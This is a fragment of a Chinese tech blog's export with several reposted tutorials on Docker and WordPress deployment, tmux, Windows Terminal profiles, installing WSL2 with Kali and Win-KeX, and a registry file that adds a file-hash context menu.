发布成功以后，登录 hub.docker.com，就可以看到已经发布的 image 文件。 十一、其他有用的命令 docker 的主要用法就是上面这些，此外还有几个命令，也非常有用。 （1）docker container start 前面的docker container run命令是新建容器，每运行一次，就会新建一个容器。同样的命令运行两次，就会生成两个一模一样的容器文件。如果希望重复使用容器，就要使用docker container start命令，它用来启动已经生成、已经停止运行的容器文件。 $ docker container start [containerID] （2）docker container stop 前面的docker container kill命令终止容器运行，相当于向容器里面的主进程发出 SIGKILL 信号。而docker container stop命令也是用来终止容器运行，相当于向容器里面的主进程发出 SIGTERM 信号，然后过一段时间再发出 SIGKILL 信号。 $ bash container stop [containerID] 这两个信号的差别是，应用程序收到 SIGTERM 信号以后，可以自行进行收尾清理工作，但也可以不理会这个信号。如果收到 SIGKILL 信号，就会强行立即终止，那些正在进行中的操作会全部丢失。 （3）docker container logs docker container logs命令用来查看 docker 容器的输出，即容器里面 Shell 的标准输出。如果docker run命令运行容器的时候，没有使用-it参数，就要用这个命令查看输出。 $ docker container logs [containerID] （4）docker container exec docker container exec命令用于进入一个正在运行的 docker 容器。如果docker run命令运行容器的时候，没有使用-it参数，就要用这个命令进入容器。一旦进入了容器，就可以在容器的 Shell 执行命令了。 $ docker container exec -it [containerID] /bin/bash （5）docker container cp docker container cp命令用于从正在运行的 Docker 容器里面，将文件拷贝到本机。下面是拷贝到当前目录的写法。 $ docker container cp [containID]:[/path/to/file] . 非常感谢你一直读到了这里，这个系列还有下一篇，介绍如何使用 Docker 搭建真正的网站，欢迎继续阅读。 （完） 以下为转载内容（转载自阮一峰）： == == == 作者： 阮一峰 日期： 2018年2月13日 Docker 是一个容器工具，提供虚拟环境。很多人认为，它改变了我们对软件的认识。 站在 Docker 的角度，软件就是容器的组合：业务逻辑容器、数据库容器、储存容器、队列容器......Docker 使得软件可以拆分成若干个标准化容器，然后像搭积木一样组合起来。 这正是微服务（microservices）的思想：软件把任务外包出去，让各种外部服务完成这些任务，软件本身只是底层服务的调度中心和组装层。 微服务很适合用 Docker 容器实现，每个容器承载一个服务。一台计算机同时运行多个容器，从而就能很轻松地模拟出复杂的微服务架构。 上一篇教程介绍了 Docker 的概念和基本用法，本文接着往下介绍，如何在一台计算机上实现多个服务，让它们互相配合，组合出一个应用程序。 我选择的示例软件是 WordPress。它是一个常用软件，全世界用户据说超过几千万。同时它又非常简单，只要两个容器就够了（业务容器 + 数据库容器），很适合教学。而且，这种\"业务 + 数据库\"的容器架构，具有通用性，许多应用程序都可以复用。 为了加深读者理解，本文采用三种方法，演示如何架设 WordPress 网站。 方法 A：自建 WordPress 容器 方法 B：采用官方的 WordPress 容器 方法 C：采用 Docker Compose 工具 一、预备工作：image 仓库的镜像网址 本教程需要从仓库下载 image 文件，但是国内访问 Docker 的官方仓库很慢，还经常断线，所以要把仓库网址改成国内的镜像站。这里推荐使用官方镜像 registry.docker-cn.com 。下面是我的 Debian 系统的默认仓库修改方法，其他系统的修改方法参考官方文档。 打开/etc/default/docker文件（需要sudo权限），在文件的底部加上一行。 DOCKER_OPTS=\\\"--registry-mirror=https://registry.docker-cn.com \\\" 然后，重启 Docker 服务。 $ sudo service docker restart 现在就会自动从镜像仓库下载 image 文件了。 二、方法 A：自建 WordPress 容器 前面说过，本文会用三种方法演示 WordPress 的安装。第一种方法就是自建 WordPress 容器。 2.1 官方 的 PHP image 首先，新建一个工作目录，并进入该目录。 $ mkdir docker-demo &amp;&amp; cd docker-demo 然后，执行下面的命令。 $ docker container run \\ --rm \\ --name wordpress \\ --volume \"$PWD/\":/var/www/html \\ php:5.6-apache 上面的命令基于php的 image 文件新建一个容器，并且运行该容器。php的标签是5.6-apache，说明装的是 PHP 5.6，并且自带 Apache 服务器。该命令的三个参数含义如下。 --rm：停止运行后，自动删除容器文件。 --name wordpress：容器的名字叫做wordpress。 --volume \"$PWD/\":/var/www/html：将当前目录（$PWD）映射到容器的/var/www/html（Apache 对外访问的默认目录）。因此，当前目录的任何修改，都会反映到容器里面，进而被外部访问到。 运行上面的命令以后，如果一切正常，命令行会提示容器对外的 IP 地址，请记下这个地址，我们要用它来访问容器。我分配到的 IP 地址是 172.17.0.2。 打开浏览器，访问 172.17.0.2，你会看到下面的提示。 Forbidden You don't have permission to access / on this server. 这是因为容器的/var/www/html目录（也就是本机的docker-demo目录）下面什么也没有，无法提供可以访问的内容。 请在本机的docker-demo目录下面，添加一个最简单的 PHP 文件index.php。 &lt;?php phpinfo(); ?&gt; 保存以后，浏览器刷新172.17.0.2，应该就会看到熟悉的phpinfo页面了。 2.2 拷贝 WordPress 安装包 既然本地的docker-demo目录可以映射到容器里面，那么把 WordPress 安装包拷贝到docker-demo目录下，不就可以通过容器访问到 WordPress 的安装界面了吗？ 首先，在docker-demo目录下，执行下面的命令，抓取并解压 WordPress 安装包。 $ wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz $ tar -xvf wordpress-4.9.4-zh_CN.tar.gz 解压以后，WordPress 的安装文件会在docker-demo/wordpress目录下。 这时浏览器访问http://172.17.0.2/wordpress，就能看到 WordPress 的安装提示了。 2.3 官方的 MySQL 容器 WordPress 必须有数据库才能安装，所以必须新建 MySQL 容器。 打开一个新的命令行窗口，执行下面的命令。 $ docker container run \\ -d \\ --rm \\ --name wordpressdb \\ --env MYSQL_ROOT_PASSWORD=123456 \\ --env MYSQL_DATABASE=wordpress \\ mysql:5.7 上面的命令会基于 MySQL 的 image 文件（5.7版本）新建一个容器。该命令的五个命令行参数的含义如下。 -d：容器启动后，在后台运行。 --rm：容器终止运行后，自动删除容器文件。 --name wordpressdb：容器的名字叫做wordpressdb --env MYSQL_ROOT_PASSWORD=123456：向容器进程传入一个环境变量MYSQL_ROOT_PASSWORD，该变量会被用作 MySQL 的根密码。 --env MYSQL_DATABASE=wordpress：向容器进程传入一个环境变量MYSQL_DATABASE，容器里面的 MySQL 会根据该变量创建一个同名数据库（本例是WordPress）。 运行上面的命令以后，正常情况下，命令行会显示一行字符串，这是容器的 ID，表示已经新建成功了。 这时，使用下面的命令查看正在运行的容器，你应该看到wordpress和wordpressdb两个容器正在运行。 $ docker container ls 其中，wordpressdb是后台运行的，前台看不见它的输出，必须使用下面的命令查看。 $ docker container logs wordpressdb 2.4 定制 PHP 容器 现在 WordPress 容器和 MySQL 容器都已经有了。接下来，要把 WordPress 容器连接到 MySQL 容器了。但是，PHP 的官方 image 不带有mysql扩展，必须自己新建 image 文件。 首先，停掉 WordPress 容器。 $ docker container stop wordpress 停掉以后，由于--rm参数的作用，该容器文件会被自动删除。 然后，在docker-demo目录里面，新建一个Dockerfile文件，写入下面的内容。 FROM php:5.6-apache RUN docker-php-ext-install mysqli CMD apache2-foreground 上面代码的意思，就是在原来 PHP 的 image 基础上，安装mysqli的扩展。然后，启动 Apache。 基于这个 Dockerfile 文件，新建一个名为phpwithmysql的 image 文件。 $ docker build -t phpwithmysql . 2.5 Wordpress 容器连接 MySQL 现在基于 phpwithmysql image，重新新建一个 WordPress 容器。 $ docker container run \\ --rm \\ --name wordpress \\ --volume \"$PWD/\":/var/www/html \\ --link wordpressdb:mysql \\ phpwithmysql 跟上一次相比，上面的命令多了一个参数--link wordpressdb:mysql，表示 WordPress 容器要连到wordpressdb容器，冒号表示该容器的别名是mysql。 这时还要改一下wordpress目录的权限，让容器可以将配置信息写入这个目录（容器内部写入的/var/www/html目录，会映射到这个目录）。 $ chmod -R 777 wordpress 接着，回到浏览器的http://172.17.0.2/wordpress页面，点击\"现在就开始！\"按钮，开始安装。 WordPress 提示要输入数据库参数。输入的参数如下。 数据库名：wordpress 用户名：root 密码：123456 数据库主机：mysql 表前缀：wp_（不变） 点击\"下一步\"按钮，如果 Wordpress 连接数据库成功，就会出现下面的页面，这就表示可以安装了。 至此，自建 WordPress 容器的演示完毕，可以把正在运行的两个容器关闭了（容器文件会自动删除）。 $ docker container stop wordpress wordpressdb 三、方法 B：Wordpress 官方镜像 上一部分的自建 WordPress 容器，还是挺麻烦的。其实不用这么麻烦，Docker 已经提供了官方 WordPress image，直接用那个就可以了。有了上一部分的基础，下面的操作就很容易理解了。 3.1 基本用法 首先，新建并启动 MySQL 容器。 $ docker container run \\ -d \\ --rm \\ --name wordpressdb \\ --env MYSQL_ROOT_PASSWORD=123456 \\ --env MYSQL_DATABASE=wordpress \\ mysql:5.7 然后，基于官方的 WordPress image，新建并启动 WordPress 容器。 $ docker container run \\ -d \\ --rm \\ --name wordpress \\ --env WORDPRESS_DB_PASSWORD=123456 \\ --link wordpressdb:mysql \\ wordpress 上面命令中，各个参数的含义前面都解释过了，其中环境变量WORDPRESS_DB_PASSWORD是 MySQL 容器的根密码。 上面命令指定wordpress容器在后台运行，导致前台看不见输出，使用下面的命令查出wordpress容器的 IP 地址。 $ docker container inspect wordpress 上面命令运行以后，会输出很多内容，找到IPAddress字段即可。我的机器返回的 IP 地址是172.17.0.3。 浏览器访问172.17.0.3，就会看到 WordPress 的安装提示。 3.2 WordPress 容器的定制 到了上一步，官方 WordPress 容器的安装就已经成功了。但是，这种方法有两个很不方便的地方。 每次新建容器，返回的 IP 地址不能保证相同，导致要更换 IP 地址访问 WordPress。 WordPress 安装在容器里面，本地无法修改文件。 解决这两个问题很容易，只要新建容器的时候，加两个命令行参数就可以了。 先把刚才启动的 WordPress 容器终止（容器文件会自动删除）。 $ docker container stop wordpress 然后，使用下面的命令新建并启动 WordPress 容器。 $ docker container run \\ -d \\ -p 127.0.0.2:8080:80 \\ --rm \\ --name wordpress \\ --env WORDPRESS_DB_PASSWORD=123456 \\ --link wordpressdb:mysql \\ --volume \"$PWD/wordpress\":/var/www/html \\ wordpress 上面的命令跟前面相比，命令行参数只多出了两个。 -p 127.0.0.2:8080:80：将容器的 80 端口映射到127.0.0.2的8080端口。 --volume \"$PWD/wordpress\":/var/www/html：将容器的/var/www/html目录映射到当前目录的wordpress子目录。 浏览器访问127.0.0.2:8080:80就能看到 WordPress 的安装提示了。而且，你在wordpress子目录下的每次修改，都会反映到容器里面。 最后，终止这两个容器（容器文件会自动删除）。 $ docker container stop wordpress wordpressdb 四、方法 C：Docker Compose 工具 上面的方法 B 已经挺简单了，但是必须自己分别启动两个容器，启动的时候，还要在命令行提供容器之间的连接信息。因此，Docker 提供了一种更简单的方法，来管理多个容器的联动。 4.1 Docker Compose 简介 Compose 是 Docker 公司推出的一个工具软件，可以管理多个 Docker 容器组成一个应用。你需要定义一个 YAML 格式的配置文件docker-compose.yml，写好多个容器之间的调用关系。然后，只要一个命令，就能同时启动/关闭这些容器。 启动所有服务 $ docker-compose up 关闭所有服务 $ docker-compose stop 4.2 Docker Compose 的安装 Mac 和 Windows 在安装 docker 的时候，会一起安装 docker compose。Linux 系统下的安装参考官方文档。 安装完成后，运行下面的命令。 $ docker-compose --version 4.3 WordPress 示例 在docker-demo目录下，新建docker-compose.yml文件，写入下面的内容。 mysql: image: mysql:5.7 environment: - MYSQL_ROOT_PASSWORD=123456 - MYSQL_DATABASE=wordpress web: image: wordpress links: - mysql environment: - WORDPRESS_DB_PASSWORD=123456 ports: - \"127.0.0.3:8080:80\" working_dir: /var/www/html volumes: - wordpress:/var/www/html 上面代码中，两个顶层标签表示有两个容器mysql和web。每个容器的具体设置，前面都已经讲解过了，还是挺容易理解的。 启动两个容器。 $ docker-compose up 浏览器访问 http://127.0.0.3:8080，应该就能看到 WordPress 的安装界面。 现在关闭两个容器。 $ docker-compose stop 关闭以后，这两个容器文件还是存在的，写在里面的数据不会丢失。下次启动的时候，还可以复用。下面的命令可以把这两个容器文件删除（容器必须已经停止运行）。 $ docker-compose rm 五、参考链接 How to Manually Build Docker Containers for WordPress, by Aleksander Koko How to Use the Official Docker WordPress Image, by Aleksander Koko Deploying WordPress with Docker, by Aleksander Koko （完） Docker源码分析 (孙宏亮版) 完整版：脚本之家-中文扫描版 Docker源码分析 (孙宏亮版) 完整版：脚本之家-中文扫描版 Docker源码分析是一本引导读者深入了解Docker实现原理的技术普及读物，此书的主要目标是通过对Docker架构和源代码的详细讲解和解剖，帮助读者对Docker的底层实现有一个全面的理解。有需要的用户可以免费下载学习。作者通过大量的流程图和代码片段对Docker的架构、Docker的重要模块，特别是对Swarm、Machine和Compose这三个模块进行了详细介绍和深度剖析，无论是Docker的使用者还是开发者，通过阅读此书都可以对Docker有更深刻的理解，能够更好的使用或者开发Docker。 作者简介 孙宏亮是DaoCloud初创团队成员，软件工程师，浙江大学计算机科学专业应届毕业研究生。读研期间活跃在PaaS和Docker开源社区，对Cloud Foundry有深入研究和丰富实践，擅长底层平台代码分析，对分布式平台的架构有一定经验，撰写了大量有深度的技术博客。 2014年末以合伙人身份加入DaoCloud团队，致力于传播以Docker为主的容器的技术，推动互联网应用的容器化步伐。 Docker介绍 Docker是Docker公司开源的一个基于轻量级虚拟化技术的容器引擎项目,整个项目基于Go语言开发，并遵从Apache 2.0协议。目前，Docker可以在容器内部快速自动化部署应用，并可以通过内核虚拟化技术(namespaces及cgroups等)来提供容器的资源隔离与安全保障等。由于Docker通过操作系统层的虚拟化实现隔离，所以Docker容器在运行时，不需要类似虚拟机(VM)额外的操作系统开销，提高资源利用率，并且提升诸如IO等方面的性能。由于众多新颖的特性以及项目本身的开放性，Docker在不到两年的时间里迅速获得诸多厂商的青睐，其中更是包括Google、Microsoft、VMware等业界行业领导者。Google在今年六月份推出了Kubernetes，提供Docker容器的调度服务，而今年8月Microsoft宣布Azure上支持Kubernetes，随后传统虚拟化巨头VMware宣布与Docker强强合作。今年9月中旬，Docker更是获得4000万美元的C轮融资，以推动分布式应用方面的发展。从目前的形势来看，Docker的前景一片大好。本系列文章从源码的角度出发，详细介绍Docker的架构、Docker的运行以及Docker的卓越特性。本文是Docker源码分析系列的第一篇———Docker架构篇。","tags":"专题 docker"},{"title":"tmux使用教程","url":"/20210404/tmux-shi-yong-jiao-cheng/","text":"相似软件Screen、byobu 转载自 阮一峰 Tmux 使用教程 Tmux 是一个终端复用器（terminal multiplexer），非常有用，属于常用的开发工具。 本文介绍如何使用 Tmux。 ※一、 Tmux 是什么？ ※1.1 会话与进程 命令行的典型使用方式是，打开一个终端窗口（terminal window，以下简称&quot;窗口&quot;），在里面输入命令。用户与计算机的这种临时的交互，称为一次&quot;会话&quot;（session） 。 会话的一个重要特点是，窗口与其中启动的进程是连在一起的。打开窗口，会话开始；关闭窗口，会话结束，会话内部的进程也会随之终止，不管有没有运行完。 一个典型的例子就是，SSH 登录远程计算机，打开一个远程窗口执行命令。这时，网络突然断线，再次登录的时候，是找不回上一次执行的命令的。因为上一次 SSH 会话已经终止了，里面的进程也随之消失了。 为了解决这个问题，会话与窗口可以&quot;解绑&quot;：窗口关闭时，会话并不终止，而是继续运行，等到以后需要的时候，再让会话&quot;绑定&quot;其他窗口。 ※1.2 Tmux 的作用 Tmux 就是会话与窗口的&quot;解绑&quot;工具，将它们彻底分离。 （1）它允许在单个窗口中，同时访问多个会话。这对于同时运行多个命令行程序很有用。 （2） 它可以让新窗口&quot;接入&quot;已经存在的会话。 （3）它允许每个会话有多个连接窗口，因此可以多人实时共享会话。 （4）它还支持窗口任意的垂直和水平拆分。 类似的终端复用器还有 GNU Screen。Tmux 与它功能相似，但是更易用，也更强大。 ※二、基本用法 ※2.1 安装 Tmux 一般需要自己安装。 12345678# Ubuntu 或 Debian$ sudo apt-get install tmux# CentOS 或 Fedora$ sudo yum install tmux# Mac$ brew install tmux ※2.2 启动与退出 安装完成后，键入tmux命令，就进入了 Tmux 窗口。启动 Tmux 窗口，底部有一个状态栏。状态栏的左侧是窗口信息（编号和名称），右侧是系统信息。 按下Ctrl+d或者显式输入exit命令，就可以退出 Tmux 窗口。 ※2.3 前缀键 Tmux 窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是Ctrl+b，即先按下Ctrl+b，快捷键才会生效。 举例来说，帮助命令的快捷键是Ctrl+b ?。它的用法是，在 Tmux 窗口中，先按下Ctrl+b，再按下?，就会显示帮助信息。 然后，按下 ESC 键或q键，就可以退出帮助。 ※三、会话管理 ※3.1 新建会话 第一个启动的 Tmux 窗口，编号是0，第二个窗口的编号是1，以此类推。这些窗口对应的会话，就是 0 号会话、1 号会话。 使用编号区分会话，不太直观，更好的方法是为会话起名。 1tmux new -s &lt;session-name&gt; 上面命令新建一个指定名称的会话。 ※3.2 分离会话 在 Tmux 窗口中，按下Ctrl+b d或者输入tmux detach命令，就会将当前会话与窗口分离。 1tmux detach 上面命令执行后，就会退出当前 Tmux 窗口，但是会话和里面的进程仍然在后台运行。 tmux ls命令可以查看当前所有的 Tmux 会话。 123$ tmux ls# or$ tmux list-session ※3.3 接入会话 tmux attach命令用于重新接入某个已存在的会话。 12345# 使用会话编号$ tmux attach -t 0# 使用会话名称$ tmux attach -t &lt;session-name&gt; ※3.4 杀死会话 tmux kill-session命令用于杀死某个会话。 12345# 使用会话编号$ tmux kill-session -t 0# 使用会话名称$ tmux kill-session -t &lt;session-name&gt; ※3.5 切换会话 tmux switch命令用于切换会话。 12345# 使用会话编号$ tmux switch -t 0# 使用会话名称$ tmux switch -t &lt;session-name&gt; ※3.6 重命名会话 tmux rename-session命令用于重命名会话。 1tmux rename-session -t 0 &lt;new-name&gt; 上面命令将0号会话重命名。 ※3.7 会话快捷键 下面是一些会话相关的快捷键。 Ctrl+b d：分离当前会话。 Ctrl+b s：列出所有会话。 Ctrl+b $：重命名当前会话。 ※四、最简操作流程 综上所述，以下是 Tmux 的最简操作流程。 新建会话tmux new -s my_session。 在 Tmux 窗口运行所需的程序。 按下快捷键Ctrl+b d将会话分离。 下次使用时，重新连接到会话tmux attach-session -t my_session。 ※五、窗格操作 Tmux 可以将窗口分成多个窗格（pane），每个窗格运行不同的命令。以下命令都是在 Tmux 窗口中执行。 ※5.1 划分窗格 tmux split-window命令用来划分窗格。 12345# 划分上下两个窗格$ tmux split-window# 划分左右两个窗格$ tmux split-window -h ※5.2 移动光标 tmux select-pane命令用来移动光标位置。 1234567891011# 光标切换到上方窗格$ tmux select-pane -U# 光标切换到下方窗格$ tmux select-pane -D# 光标切换到左边窗格$ tmux select-pane -L# 光标切换到右边窗格$ tmux select-pane -R ※5.3 交换窗格位置 tmux swap-pane命令用来交换窗格位置。 12345# 当前窗格上移$ tmux swap-pane -U# 当前窗格下移$ tmux swap-pane -D ※5.4 窗格快捷键 下面是一些窗格操作的快捷键。 Ctrl+b %：划分左右两个窗格。 Ctrl+b &quot;：划分上下两个窗格。 Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。 Ctrl+b ;：光标切换到上一个窗格。 Ctrl+b o：光标切换到下一个窗格。 Ctrl+b &#123;：当前窗格与上一个窗格交换位置。 Ctrl+b &#125;：当前窗格与下一个窗格交换位置。 Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。 Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。 Ctrl+b x：关闭当前窗格。 Ctrl+b !：将当前窗格拆分为一个独立窗口。 Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。 Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。 Ctrl+b q：显示窗格编号。 ※六、窗口管理 除了将一个窗口划分成多个窗格，Tmux 也允许新建多个窗口。 ※6.1 新建窗口 tmux new-window命令用来创建新窗口。 1234$ tmux new-window# 新建一个指定名称的窗口$ tmux new-window -n &lt;window-name&gt; ※6.2 切换窗口 tmux select-window命令用来切换窗口。 12345# 切换到指定编号的窗口$ tmux select-window -t &lt;window-number&gt;# 切换到指定名称的窗口$ tmux select-window -t &lt;window-name&gt; ※6.3 重命名窗口 tmux rename-window命令用于为当前窗口起名（或重命名）。 1tmux rename-window &lt;new-name&gt; ※6.4 窗口快捷键 下面是一些窗口操作的快捷键。 Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。 Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。 Ctrl+b n：切换到下一个窗口。 Ctrl+b &lt;number&gt;：切换到指定编号的窗口，其中的&lt;number&gt;是状态栏上的窗口编号。 Ctrl+b w：从列表中选择窗口。 Ctrl+b ,：窗口重命名。 ※七、其他命令 下面是一些其他命令。 1234567891011# 列出所有快捷键，及其对应的 Tmux 命令$ tmux list-keys# 列出所有 Tmux 命令及其参数$ tmux list-commands# 列出当前所有 Tmux 会话的信息$ tmux info# 重新加载当前的 Tmux 配置$ tmux source-file ~/.tmux.conf ※八、参考链接 A Quick and Easy Guide to tmux Tactical tmux: The 10 Most Important Commands Getting started with Tmux （完）","tags":"linux tmux terminal"},{"title":"Windows Terminal专题","url":"/20210401/windowsterminal-zhuan-ti/","text":"设置文档 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&quot;list&quot;: [ &#123; &quot;guid&quot;: &quot;&#123;41dd7a51-f0e1-4420-a2ec-1a7130b7e950&#125;&quot;, &quot;name&quot;: &quot;命令提示符(管理员)&quot;, &quot;commandline&quot;: &quot;gsudo.exe cmd.exe&quot;, &quot;hidden&quot;: false &#125;, &#123; // Make changes here to the powershell.exe profile. &quot;guid&quot;: &quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;, &quot;name&quot;: &quot;Windows PowerShell&quot;, &quot;commandline&quot;: &quot;powershell.exe&quot;, &quot;hidden&quot;: false &#125;, &#123; // Make changes here to the cmd.exe profile. &quot;guid&quot;: &quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;, &quot;name&quot;: &quot;命令提示符&quot;, &quot;commandline&quot;: &quot;cmd.exe&quot;, &quot;hidden&quot;: false &#125;, &#123; &quot;guid&quot;: &quot;&#123;07b52e3e-de2c-5db4-bd2d-ba144ed6c273&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Ubuntu-20.04&quot;, &quot;source&quot;: &quot;Windows.Terminal.Wsl&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Azure Cloud Shell&quot;, &quot;source&quot;: &quot;Windows.Terminal.Azure&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;46ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;kali-linux&quot;, &quot;source&quot;: &quot;Windows.Terminal.Wsl&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;2c4de342-38b7-51cf-b940-2309a097f518&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Ubuntu&quot;, &quot;source&quot;: &quot;Windows.Terminal.Wsl&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;kali-KeX&quot;, &quot;commandline&quot;: &quot;wsl kex wtstart&quot;, &#125; ]","tags":"专题 windows-terminal"},{"title":"WSL2专题","url":"/20210401/wsl2-zhuan-ti/","text":"安装 WSL2 ※开启虚拟机功能 ❝ PS：由于WSL2是使用HyperV虚拟机的，所以开启之后会和VMware和VirtualBox冲突，可以通过升级VMware和vbox到支持HyperV的版本解决。❞ 在控制面板 -&gt; 程序和功能 -&gt; Windows 功能窗口中勾选适用于 Linux 的 Windows 子系统 功能，点击确定，并按照提示重启电脑。 或以管理员身份在命令行键入 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 启用虚拟化 使用管理员权限打开PowerShell，输入以下命令： 12dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestartdism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart ※安装发行版 在 Windows 应用商店搜索 WSL ，选择自己想要的 Linux 发行版，点击下载安装即可。这里选择的是 Kali。 ※下载WSL2的Linux内核 下载地址：https://aka.ms/wsl2kernel 或 WSL2-kernel ※升级WSL2 12wsl -l # 查看WSL列表wsl --set-version kali-linux 2 ※配置 安装完成后，在 Kali Linux 下，输入如下命令，安装工具集 1sudo apt update &amp;&amp; sudo apt upgrade 安装Kali Linux工具包 安装标准工具包 1sudo apt install kali-linux-default 安装大工具包（大概7 8G） 1sudo apt install kali-linux-large ※GUI (Win-KeX) Win-Kex工具包是Kali提供的在Windows上运行的图形化工具包，可以一键式傻瓜化在WSL中跑图形界面。 1sudo apt install -y kali-win-kex 安装完毕后，可使用如下命令启动 1234567# 启动cd ~kex# 关闭kex stop# 窗口模式kex --win -s Win-KeX 还提供了无缝模式 12# 无缝模式kex --sl -s ※将 Kali 和 Win-KeX 整合进 Terminal Windows Terminal 的配置中添加 123456789101112131415161718192021222324&#123; &quot;list&quot;: [ &#123; &quot;guid&quot;: &quot;&#123;46ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Kali&quot;, &quot;source&quot;: &quot;Windows.Terminal.Wsl&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;KaTex&quot;, // 窗口模式启动 &quot;commandline&quot;: &quot;wsl -d kali-linux kex --wtstart -s&quot; &#125;, &#123; &quot;guid&quot;: &quot;&#123;55ca431a-3a87-5fb3-83cd-11ececc031d2&#125;&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Win-KeX&quot;, &quot;commandline&quot;: &quot;wsl kex wtstart&quot;, &#125; ]&#125; WSL2 优化压缩 随着使用时间的延长，WSL2占用的硬盘空间会越来越多，这个时候就需要对其文件进行压缩。方法如下 12345678wsl --shutdowndiskpart# open window Diskpartselect vdisk file=####attach vdisk readonlycompact vdiskdetach vdisk ※遇到的问题","tags":"专题 wsl windows-subsystem-linux linux"},{"title":"Windows右键hash菜单","url":"/20210329/windows-you-jian-hash-cai-dan/","text":"将以下代码另存为hash.reg，双击合并到注册表即可。使用时在文件上右键选择“校验文件 Hash”，选择校验方式即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\\*\\shell\\hash]&quot;MUIVerb&quot;=&quot;校验文件 Hash&quot;&quot;SubCommands&quot;=&quot;&quot;&quot;Icon&quot;=&quot;PowerShell.exe&quot;; SHA1[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\01menu]&quot;MUIVerb&quot;=&quot;SHA1&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\01menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA1 | format-list&quot;; SHA256[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\02menu]&quot;MUIVerb&quot;=&quot;SHA256&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\02menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA256 | format-list&quot;; SHA384[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\03menu]&quot;MUIVerb&quot;=&quot;SHA384&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\03menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA384 | format-list&quot;; SHA512[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\04menu]&quot;MUIVerb&quot;=&quot;SHA512&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\04menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA512 | format-list&quot;; MACTripleDES[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\05menu]&quot;MUIVerb&quot;=&quot;MACTripleDES&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\05menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm MACTripleDES | format-list&quot;; MD5[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\06menu]&quot;MUIVerb&quot;=&quot;MD5&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\06menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm MD5 | format-list&quot;; RIPEMD160[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\07menu]&quot;MUIVerb&quot;=&quot;RIPEMD160&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\07menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm RIPEMD160 | format-list&quot;; Allget-filehash -literalpath &#x27;%1&#x27; -algorithm RIPEMD160 | format-list[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\08menu]&quot;CommandFlags&quot;=dword:00000020&quot;MUIVerb&quot;=&quot;校验全部&quot;[HKEY_CLASSES_ROOT\\*\\shell\\hash\\shell\\08menu\\command]@=&quot;powershell -noexit get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA1 | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA256 | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA384 | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm SHA512 | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm MACTripleDES | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm MD5 | format-list;get-filehash -literalpath &#x27;%1&#x27; -algorithm RIPEMD160 | format-list&quot;","tags":""},{"title":"jQuery专题","url":"/20210327/jquery-zhuan-ti/","text":"[TOC] 